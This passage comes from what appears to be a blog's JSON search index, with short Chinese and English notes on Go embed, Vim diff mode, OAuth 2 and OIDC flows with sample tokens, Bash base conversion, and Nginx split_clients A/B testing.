style=\"color:#a6e22e\"\u003e_\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello2.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;p/he llo.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;p/hello-2.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"匹配模式\"\u003e匹配模式\u003c/h5\u003e\n\u003cp\u003ego:embed 指令中可以只写文件夹名，此文件夹中除了.和_开头的文件和文件夹都会被嵌入，并且子文件夹也会被递归的嵌入，形成一个此文件夹的文件系统。\u003c/p\u003e","tags":["URL","Go"],"title":"Go embed 简明教程"},{"categories":["URL","command line","Vim"],"contents":" Using Vim as a Diff Tool command vim -d file1.txt file2.txt or vimdiff file1.txt file2.txt\nSwitching Between Diff Windows: Ctrl-w + Ctrl-w Changing Split Window Orientation ctrl-w + K key combination to change window orientation from vertical to horizontal. ctrl-w + H shortcut to switch back window orientation to a vertical split. Jumping Between Changes ]c key combination to go to the next change. [c shortcut to jump to the previous change. Applying Changes From the Diff Window: :diffget, :diffput Export Diff to the HTML Web Page: :TOhtml | w ~/diff.html ","date":"July 7, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220707-vim-diff-tool/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/vim-diff-tool\" target=\"_blank\" rel=\"noopener\"\u003eUsing Vim as a Diff Tool\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"command\"\u003ecommand\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003evim -d file1.txt file2.txt\u003c/code\u003e\nor\n\u003ccode\u003evimdiff file1.txt file2.txt\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSwitching Between Diff Windows: \u003ccode\u003eCtrl-w + Ctrl-w\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eChanging Split Window Orientation\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ectrl-w + K\u003c/code\u003e key combination to change window orientation from vertical to horizontal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ectrl-w + H\u003c/code\u003e shortcut to switch back window orientation to a vertical split.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eJumping Between Changes\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e]c\u003c/code\u003e key combination to go to the next change.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e[c\u003c/code\u003e shortcut to jump to the previous change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eApplying Changes From the Diff Window: \u003ccode\u003e:diffget\u003c/code\u003e, \u003ccode\u003e:diffput\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExport Diff to the HTML Web Page: \u003ccode\u003e:TOhtml | w ~/diff.html\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","command line","Vim"],"title":"Using Vim as a Diff Tool"},{"categories":["URL","OIDC","Authentication","Authorization","OAuth"],"contents":" OIDC(OpenID Connect) 简介 Authentication vs. authorization Authentication 通常是指校验是否是用户本人的这个过程，而 Authorization 则更多的是指用户是否有权限。通常我们都是先校验 是否是用户本人，然后再校验用户是否有权限。也就是先开始 Authentication，再开始 Authorization。\nAuthentication Authorization Determines whether users are who they claim to be Determines what users can and cannot access Challenges the user to validate credentials (for example, through passwords, answers to security questions, or facial recognition) Verifies whether access is allowed through policies and rules Usually done before authorization Usually done after successful authentication Generally, transmits info through an ID Token Generally, transmits info through an Access Token Generally governed by the OpenID Connect (OIDC) protocol Generally governed by the OAuth 2.0 framework Example: Employees in a company are required to authenticate through the network before accessing their company email Example: After an employee successfully authenticates, the system determines what information the employees are allowed to access OAuth 2 Client Credentials Grant 这种模式是最简单的，其实就是客户端告诉服务端自己是哪个客户端，服务器就将 access_token 下发\n这种模式很少用，主要用于客户端非常可靠的情况，例如登录托管的云桌面系统，系统向服务器请求 token，服务器立刻下发，之后 用户就以云桌面特定用户的身份进行使用。\n+---------+ +---------------+ | | | | | |\u0026gt;--(A)- Client Authentication ---\u0026gt;| Authorization | | Client | | Server | | |\u0026lt;--(B)---- Access Token ---------\u0026lt;| | | | | | +---------+ +---------------+ Figure 6: Client Credentials Flow The flow illustrated in Figure 6 includes the following steps: (A) The client authenticates with the authorization server and requests an access token from the token endpoint. (B) The authorization server authenticates the client, and if valid, issues an access token. Resource Owner Password Credentials Grant 用户名密码模式，这种流程相对来说，比较适用于可信任的客户端，例如自家研发的客户端，客户端要求用户输入用户名和密码，之后 向服务器请求，服务区校验用户名密码之后，下发 access_token\n+----------+ | Resource | | Owner | | | +----------+ v | Resource Owner (A) Password Credentials | v +---------+ +---------------+ | |\u0026gt;--(B)---- Resource Owner -------\u0026gt;| | | | Password Credentials | Authorization | | Client | | Server | | |\u0026lt;--(C)---- Access Token ---------\u0026lt;| | | | (w/ Optional Refresh Token) | | +---------+ +---------------+ Figure 5: Resource Owner Password Credentials Flow The flow illustrated in Figure 5 includes the following steps: (A) The resource owner provides the client with its username and password. (B) The client requests an access token from the authorization server\u0026#39;s token endpoint by including the credentials received from the resource owner. When making the request, the client authenticates with the authorization server. (C) The authorization server authenticates the client and validates the resource owner credentials, and if valid, issues an access token. Implicit Grant Implicit Grant 模式，适用于不方便暴露 client_secret 的地方，比如浏览器端（网页），分发出去的 App，都属于容易被逆向的程序， 这种情况就可以使用 Implicit Grant\n以最开始我们的例子，Slack 弹出 webview，加载 Google 的授权页面，Google 显示选择对应帐号，下面会提示会让客户端读取 用户信息，当用户点击确认之后，Google 校验完毕，会将页面重定向到客户端指定的地址，并且在 URL fragment 中带上 access_token。\n+----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- \u0026amp; Redirection URI ---\u0026gt;| | | User- | | Authorization | | Agent -|----(B)-- User authenticates --\u0026gt;| Server | | | | | | |\u0026lt;---(C)--- Redirection URI ----\u0026lt;| | | | with Access Token +---------------+ | | in Fragment | | +---------------+ | |----(D)--- Redirection URI ----\u0026gt;| Web-Hosted | | | without Fragment | Client | | | | Resource | | (F) |\u0026lt;---(E)------- Script ---------\u0026lt;| | | | +---------------+ +-|--------+ | | (A) (G) Access Token | | ^ v +---------+ | | | Client | | | +---------+ Note: The lines illustrating steps (A) and (B) are broken into two parts as they pass through the user-agent. Figure 4: Implicit Grant Flow The flow illustrated in Figure 4 includes the following steps: (A) The client initiates the flow by directing the resource owner\u0026#39;s user-agent to the authorization endpoint. The client includes its client identifier, requested scope, local state, and a redirection URI to which the authorization server will send the user-agent back once access is granted (or denied). (B) The authorization server authenticates the resource owner (via the user-agent) and establishes whether the resource owner grants or denies the client\u0026#39;s access request. (C) Assuming the resource owner grants access, the authorization server redirects the user-agent back to the client using the redirection URI provided earlier. The redirection URI includes the access token in the URI fragment. (D) The user-agent follows the redirection instructions by making a request to the web-hosted client resource (which does not include the fragment per [RFC2616]). The user-agent retains the fragment information locally. (E) The web-hosted client resource returns a web page (typically an HTML document with an embedded script) capable of accessing the full redirection URI including the fragment retained by the user-agent, and extracting the access token (and other parameters) contained in the fragment. (F) The user-agent executes the script provided by the web-hosted client resource locally, which extracts the access token. (G) The user-agent passes the access token to the client. Authorization Code Grant Authorization Code 模式，这是最复杂，也是最安全的一种授权模式\n首先 Slack 客户端打开 webview，加载 Google 的授权页面，并且指定模式为 Authorization Code，Google 让用户确认之后，重定向 回 Slack 指定的 URL，并且在参数中附带一个参数，叫做 code，随后 Slack 的服务端拿着 code，带上 client_id, client_secret 再次请求 Google，此时 Google 校验 token，如成功，则下发 access_token。由于是 Slack 的服务器直接请求获得的 token，因此会 比前面三种都更加安全。\n+----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- \u0026amp; Redirection URI ----\u0026gt;| | | User- | | Authorization | | Agent -+----(B)-- User authenticates ---\u0026gt;| Server | | | | | | -+----(C)-- Authorization Code ---\u0026lt;| | +-|----|---+ +---------------+ | | ^ v (A) (C) | | | | | | ^ v | | +---------+ | | | |\u0026gt;---(D)-- Authorization Code ---------\u0026#39; | | Client | \u0026amp; Redirection URI | | | | | |\u0026lt;---(E)----- Access Token -------------------\u0026#39; +---------+ (w/ Optional Refresh Token) Note: The lines illustrating steps (A), (B), and (C) are broken into two parts as they pass through the user-agent. Figure 3: Authorization Code Flow The flow illustrated in Figure 3 includes the following steps: (A) The client initiates the flow by directing the resource owner\u0026#39;s user-agent to the authorization endpoint. The client includes its client identifier, requested scope, local state, and a redirection URI to which the authorization server will send the user-agent back once access is granted (or denied). (B) The authorization server authenticates the resource owner (via the user-agent) and establishes whether the resource owner grants or denies the client\u0026#39;s access request. (C) Assuming the resource owner grants access, the authorization server redirects the user-agent back to the client using the redirection URI provided earlier (in the request or during client registration). The redirection URI includes an authorization code and any local state provided by the client earlier. (D) The client requests an access token from the authorization server\u0026#39;s token endpoint by including the authorization code received in the previous step. When making the request, the client authenticates with the authorization server. The client includes the redirection URI used to obtain the authorization code for verification. (E) The authorization server authenticates the client, validates the authorization code, and ensures that the redirection URI received matches the URI used to redirect the client in step (C). If valid, the authorization server responds back with an access token and, optionally, a refresh token. Authorization Code PKCE 扩展 这个模式，和 Authorization Code 基本相同，不同的地方在于不暴露 client_secret，因此可以用于浏览器等。流程如下：\n首先浏览器生成随机字符串，我们称之为 code_verifier，长度限制在 43-128 字符 随后，我们将 code_verifier 做 sha256 加密，然后做 URL safe base64 encode，得到的字符我们称为 code_challenge 接着，客户端打开授权服务器的页面，并且在参数中附带 code_challenge=巴拉巴拉巴拉\u0026amp;code_challenge_method=S256， code_challenge 是第二步中生成的，code_challenge_method 指定哈希方法，S256 指的是 sha256，授权服务器将这些信息记录下来 随后服务器提示用户是否授权，当用户授权之后，服务器回调浏览器指定的 URL，并且带上 code 客户端将 code 提取出来，然后请求授权服务器，并且带上 code 和 code_verifier 授权服务器提取请求中的 code_verifier，将其做 sha256，并且与第三步中的 code_challenge 进行对比，如果一致，则说明授权 成功，于是下发 access_token\nJWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 其实就是三部分：\nHeader，指示 token 类型和签名算法 Payload，包含了真正有用的信息，通常也叫做 claims Signature，这是 Header 和 Payload 进行签名之后的结果 OpenID Connect(OIDC) OIDC 主要的目的在于登录用户，获取用户信息，而不是获取其它权限。前面我们说了，OIDC 基于 OAuth 2， 因此，OIDC 可以使用 Authorization Code 模式，也可以使用 Implicit 模式，还有一种 Hybrid 模式。\n通过 OIDC，我们可以以第三方系统的身份来登录另外一个系统，并且获取一些基本的资料，例如 first name, last name, username, email, avatar url 等。\nAuthentication using the Authorization Code Flow The Authorization Code Flow goes through the following steps:\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an Authorization Code. Client requests a response using the Authorization Code at the Token Endpoint. Client receives a response that contains an ID Token and Access Token in the response body. Client validates the ID token and retrieves the End-User\u0026rsquo;s Subject Identifier. 基本就是 OAuth 2 Authorization Code 模式的流程，区别在于，在 scope 参数中，一定有一项叫做 openid，另外一点就在于最终 的返回结果里，多了一项 id_token\n{ \u0026#34;access_token\u0026#34;: \u0026#34;SlAV32hkKG\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;refresh_token\u0026#34;: \u0026#34;8xLOxBtZp8\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;id_token\u0026#34;: \u0026#34;eyJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWdkazcifQ.ewogImlzc yI6ICJodHRwOi8vc2VydmVyLmV4YW1wbGUuY29tIiwKICJzdWIiOiAiMjQ4Mjg5 NzYxMDAxIiwKICJhdWQiOiAiczZCaGRSa3F0MyIsCiAibm9uY2UiOiAibi0wUzZ fV3pBMk1qIiwKICJleHAiOiAxMzExMjgxOTcwLAogImlhdCI6IDEzMTEyODA5Nz AKfQ.ggW8hZ1EuVLuxNuuIJKX_V8a_OMXzR0EHR9R6jgdqrOOF4daGU96Sr_P6q Jp6IcmD3HP99Obi1PRs-cwh3LO-p146waJ8IhehcwL7F09JdijmBqkvPeB2T9CJ NqeGpe-gccMg4vfKjkM8FcGvnzZUN4_KSP0aAp1tOJ1zZwgjxqGByKHiOtX7Tpd QyHE5lcMiKPXfEIQILVq0pc_E2DzL7emopWoaoZTF_m0_N0YzFC6g6EJbOEoRoS K5hoDalrcvRYLSrQAZZKflyuVCyixEoV9GfNQC3_osjzw2PAithfubEEBLuVVk4 XUVrWOLrLl0nx7RkKU8NXNHq-rvKMzqg\u0026#34; } id_token\n{ \u0026#34;iss\u0026#34;: \u0026#34;http://server.example.com\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;248289761001\u0026#34;, \u0026#34;aud\u0026#34;: \u0026#34;s6BhdRkqt3\u0026#34;, \u0026#34;nonce\u0026#34;: \u0026#34;n-0S6_WzA2Mj\u0026#34;, \u0026#34;exp\u0026#34;: 1311281970, \u0026#34;iat\u0026#34;: 1311280970 } iss 是 Issuer 的缩写，值是颁发这个 OpenID 的 URL sub 是 Subject 的缩写，指的是这个 OpenID 对应的用户 aud 是 Audience(s) 的缩写，指的是这个 OpenID 所授权的 client id(可能有多个) exp 是 超时时间 iat 是 颁发时间 nonce 是随机字符串 Authentication using the Implicit Flow 步骤如下：\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an ID Token and, if requested, an Access Token. Client validates the ID token and retrieves the End-User\u0026rsquo;s Subject Identifier. 流程也基本和 OAuth 2 的 Implicit 模式一致，区别在于 response_type 的值不是 token，而是 id_token token 或者 id_token， 对于响应结果，也是会新增加一个 id_token 在 URL fragment 里。\nAuthentication using the Hybrid Flow 步骤如下：\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an Authorization Code and, depending on the Response Type, one or more additional parameters. Client requests a response using the Authorization Code at the Token Endpoint. Client receives a response that contains an ID Token and Access Token in the response body. Client validates the ID Token and retrieves the End-User\u0026rsquo;s Subject Identifier. 区别在于，请求参数中，response_type 的值是 code id_token 或 code token 或 code id_token token：\n当值是 code token 时，会返回 code, access_token 当值是 code id_token 时，会返回 code, id_token 当值是 code id_token token 时，会返回 code, id_token, access_token ","date":"July 6, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220706-openid-connect/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jiajunhuang.com/articles/2022_07_06-openid_connect.md.html\" target=\"_blank\" rel=\"noopener\"\u003eOIDC(OpenID Connect) 简介\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"authentication-vs-authorization\"\u003eAuthentication vs. authorization\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAuthentication 通常是指校验是否是用户本人的这个过程，而 Authorization 则更多的是指用户是否有权限。通常我们都是先校验 是否是用户本人，然后再校验用户是否有权限。也就是先开始 Authentication，再开始 Authorization。\u003c/p\u003e\u003c/blockquote\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eAuthentication\u003c/th\u003e\n          \u003cth\u003eAuthorization\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eDetermines whether users are who they claim to be\u003c/td\u003e\n          \u003ctd\u003eDetermines what users can and cannot access\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eChallenges the user to validate credentials (for example, through passwords, answers to security questions, or facial recognition)\u003c/td\u003e\n          \u003ctd\u003eVerifies whether access is allowed through policies and rules\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eUsually done before authorization\u003c/td\u003e\n          \u003ctd\u003eUsually done after successful authentication\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eGenerally, transmits info through an ID Token\u003c/td\u003e\n          \u003ctd\u003eGenerally, transmits info through an Access Token\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eGenerally governed by the OpenID Connect (OIDC) protocol\u003c/td\u003e\n          \u003ctd\u003eGenerally governed by the OAuth 2.0 framework\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExample: Employees in a company are required to authenticate through the network before accessing their company email\u003c/td\u003e\n          \u003ctd\u003eExample: After an employee successfully authenticates, the system determines what information the employees are allowed to access\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"oauth-2\"\u003eOAuth 2\u003c/h3\u003e\n\u003ch4 id=\"client-credentials-grant\"\u003e\u003ca href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.4\" target=\"_blank\" rel=\"noopener\"\u003eClient Credentials Grant\u003c/a\u003e\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这种模式是最简单的，其实就是客户端告诉服务端自己是哪个客户端，服务器就将 access_token 下发\u003c/p\u003e","tags":["URL","OIDC","Authentication","Authorization","OAuth"],"title":"OIDC(OpenID Connect) 简介"},{"categories":["URL","BASH"],"contents":" Bash Bitwise Operators Bash\u0026rsquo;s Tools for Base Conversion Bash\u0026rsquo;s arithmetic expansion allows us to write numbers in any base by prefixing the numeric digits of the base followed by the hash symbol. $ echo $((2#1001)) 9 bc allows us to convert effortlessly between bases, using the parameters ibase (for the input base) and obase (for the output base). So, let\u0026rsquo;s convert the decimal number 9 to base 2 $ echo \u0026#34;ibase=10;obase=2;9\u0026#34; | bc 1001 ","date":"July 4, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220704-bash-bitwise-operators/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/bash-bitwise-operators\" target=\"_blank\" rel=\"noopener\"\u003eBash Bitwise Operators\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"bashs-tools-for-base-conversion\"\u003eBash\u0026rsquo;s Tools for Base Conversion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eBash\u0026rsquo;s arithmetic expansion allows us to write numbers in any base by prefixing the numeric digits of the base followed by the hash symbol.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ echo \u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2#1001\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003ebc allows us to convert effortlessly between bases, using the parameters ibase (for the input base) and obase (for the output base). So, let\u0026rsquo;s convert the decimal number 9 to base 2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ibase=10;obase=2;9\u0026#34;\u003c/span\u003e | bc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","BASH"],"title":"Bash Bitwise Operators"},{"categories":["URL","NGINX","Testing"],"contents":" Nginx 使用 split_clients 进行简易 A/B 测试 ngx_http_split_clients_module configure 这里举例，我们想要 20% 的用户跳转到网址 https://example.com/，30% 的用户跳转到网址 https://example.org/，剩下的跳转到网址 https://examle.edu/\nsplit_clients \u0026#34;${remote_addr}AAA\u0026#34; $variant { 20% https://example.com/; 30% https://example.org/; * https://example.edu/; } server { listen 80; listen [::]:80; server_name _; return 302 ${variant}; } 上述例子中，按照访客请求的 IP 地址 加上 AAA 字符串 会使用 MurmurHash2 转换成数字，如果得出的数字在前 20%，那么 $variant 值为 https://example.com/，相应的在中间 30% 区间的值为 https://example.org/，其他的为 https://example.edu/。\n指定不同的目录 root /var/www/${variant}; 指定不同的首页 index index-${variant}.html; ","date":"July 4, 2022","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220704-nginx-ab-testing/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://u.sb/nginx-ab-testing/\" target=\"_blank\" rel=\"noopener\"\u003eNginx 使用 split_clients 进行简易 A/B 测试\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"ngx_\"\u003e\u003ca href=\"https://nginx.org/en/docs/http/ngx_http_split_clients_module.html\" target=\"_blank\" rel=\"noopener\"\u003engx_http_split_clients_module\u003c/a\u003e\u003c/h5\u003e\n\u003ch5 id=\"configure\"\u003econfigure\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这里举例，我们想要 20% 的用户跳转到网址 \u003ca href=\"https://example.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.com/\u003c/a\u003e，30% 的用户跳转到网址 \u003ca href=\"https://example.org/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.org/\u003c/a\u003e，剩下的跳转到网址 \u003ca href=\"https://examle.edu/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://examle.edu/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003esplit_clients\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e${remote_addr}AAA\u0026#34; $variant {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e20%\u003c/span\u003e               \u003cspan style=\"color:#e6db74\"\u003ehttps://example.com/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e30%\u003c/span\u003e               \u003cspan style=\"color:#e6db74\"\u003ehttps://example.org/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e                 \u003cspan style=\"color:#e6db74\"\u003ehttps://example.edu/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e302\u003c/span\u003e ${variant};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上述例子中，按照访客请求的 IP 地址 加上 AAA 字符串 会使用 MurmurHash2 转换成数字，如果得出的数字在前 20%，那么 $variant 值为 \u003ca href=\"https://example.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.com/\u003c/a\u003e，相应的在中间 30% 区间的值为 \u003ca href=\"https://example.org/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.org/\u003c/a\u003e，其他的为 \u003ca href=\"https://example.edu/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.edu/\u003c/a\u003e。\u003c/p\u003e\n\u003ch6 id=\"指定不同的目录\"\u003e指定不同的目录\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/www/\u003c/span\u003e${variant};\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"指定不同的首页\"\u003e指定不同的首页\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 